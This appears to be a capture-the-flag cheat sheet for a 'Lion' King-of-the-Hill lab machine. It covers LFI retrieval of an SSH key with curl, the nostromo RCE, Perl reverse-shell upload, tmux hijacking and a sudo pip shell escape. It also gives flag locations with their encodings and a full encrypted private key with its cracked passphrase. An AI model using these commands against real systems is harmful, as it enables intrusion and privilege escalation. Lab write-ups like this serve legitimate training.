# Lion KOTH machine

note: ssh is on `1337`

path to foothold:

- can get in as `gloria` due to LFI on `:5555/?page=../../../../../../home/gloria/.ssh/id_rsa`. needs to be cracked with john
  - use `curl --path-as-is <ip>:5555/?page=../../../../../../home/gloria/.ssh/id_rsa` to grab it
  - the password has been `dance` over several tests
- can also get in as `gloria` via `:8080`, which runs nostromo 1.9.6 webserver vulnerable to RCE via [this](https://www.exploit-db.com/exploits/47837)
- can get in as `alex` due to unrestricted file load on `:80/uploads`. file should be a perl reverse shell script, e.g. from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl) to be immediately executed
- can get in as `marty` by connecting to a random port between 10000 and max. warning: this seems to get wrecked by rustscan i think. if connectable, basically serves as a cmd shell.

path to root:

- all users can seemingly hijack a tmux session used by root: `export TMUX=/.dev/session,1234,0` then just `tmux` to get a root session. best used with gloria after sshing in.
- `alex` can run pip3 as root via sudoers. doing the following will start a root shell, with no screen feedback. careful typing can create a suid sh binary or similar

  ```
  TF=$(mktemp -d)
  echo "import pty; pty.spawn('/bin/bash')" > $TF/setup.py
  sudo pip install $TF
  ```
  
## flags:

- `/home/marty/user.txt` - reversed
- `/home/gloria/user.txt` - as is
- `/home/alex/user.txt` - vigenere with `n`
- `/root/.flag` - as is
- random high port: thm

## glorias id_rsa (password `dance`)

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,DEA2FCB97D9A7EE91BB5502188F24BCA

5m/tHlXFlre3iBu/0wnnfEyS/p7qd0yjLDuG3jblth2CpwqIvPjGGq6hoFr6xdZO
8DOR/D16XDblHvvpJBlVfqHuXzIFbqDYCgvAeB8cZbxLaqhSi0H5fHT+N0MrMM5H
p3ejg2Nwk67BxygtjnvYgXKu+ALk0/NLDAj0NzztX+yOsSPvsyR2UjUSo352pMBt
lokw3kshMcqKs0G1UhBphV5bUgUTA0nPi5WBlIdmWC+Re0EHH+RvLulg0AxR6v5Q
UxqJJ/i0dLp6N7nTFANde+I5JwPEDJ/SGJJRWB/srcpVz3PSZuEJht83nmcJRZCz
S/x7iOhIUA1vBlexg/Td911H/95sofArhZDMPX54IMO7/q5AfIjDpqD8U9Pts7R0
aBq+1m2RfVB85FM11kJv5T0uNW6t5dP8BVb7Jqz60okgJg4cJMu5YMX7vj3xCxxy
5Hlc7PA/kIy/y2tRJmArvheuFB7qjRIPcuw1gw1TKDCUHS29aiN+ePCS4f236/if
9VwHnfp8wCUnO6ApRX9sJ6iAPMA8JYFpylIL/0XqEjZdu+ESWetTfGzsxXRdeNkY
L1/H4W9mNNIbNTnL3irr4SuKowFpKwxp6xhloZ4boyiWsdfLpmtUBE5euxjlppWp
2y7ZbtuKiqdTHkhPOZOnx7oi2FmWw81P4wS6nF2ObPpSq5LGf9TiLEw5i0icedkp
rnd/qkhkBuIQb6CKlW9m3AXgMRVQXa78J1lx60FdO1B9mtuhOy529GcwVkWh856x
MesHWvY33GmW0QcVKnUqhhFDbkT0l/X7UERTMAHVKZhfPeChuo/7LoqUqdMI57Se
U66OS9bu0INLLwcSlOAL9aweynt8MFo1DS+xQsJWTLSBnVz7iT6IMYUfhtO3gi5/
Oginxw/FPmGJ6THuFWi15k9dDdO3nBJhAQDHRpMYi4BLm/xPF7EXhgiGy6sBVGrF
PYlXHZvlQEJvHd/DCw0uwolEc3z4CilGKz1BX0WbCp9cEgkmM+Ez7QTvvBa5i6kg
qh1pAaZ+cNFDJi9bn76qEaCLCd1FMPnpcZgMUgwBfyKM+1YXa0gbxlS8fqgU066j
Mol50cLTM8D4tny3OvPcjW4FveCkhqJjGK7DY1Us7R3VDWAjOYIaMqSIM2ip6iLZ
ukq7K1r0t68eVDuDGcMLjfVihGywyqglqnqaXYcJ8+19ae76E3HVFIWbSU409fMp
fs8r6QLnuxvX1HHa74Hctuo6fzB7qokKV51ChmpXjN8h5uwEl0msbJSrKlIeYy0S
uURTlfqDq50HBr2yJYeuDzEpRjZuucXqkCIRZLSjKedf9mBtMq/3CvN9K/P45A2H
BYxl0pcZPaeUiwdR/bycLK1tBZm5kVSGIU2fK7IsKrgqZxzKS6kdr2FFsKs3HWMF
ScVJZPT4dqDo3PSIQUw7q0GixCLLdDU9p45CSKPVySYyiGU22RTQS2ccGEcCTurj
lcY0pO4wZmm5GkseF5moa/1c3aOUZOESAlWGpEg5PNPt3U/SWJTpziGv3NY5DLq9
R9OsbX0gkO711f8RvRTELQIYFIO/0LcKTjY16g8MtBlMKYCyJ0cWLVWAUoggJxiR
-----END RSA PRIVATE KEY-----
```
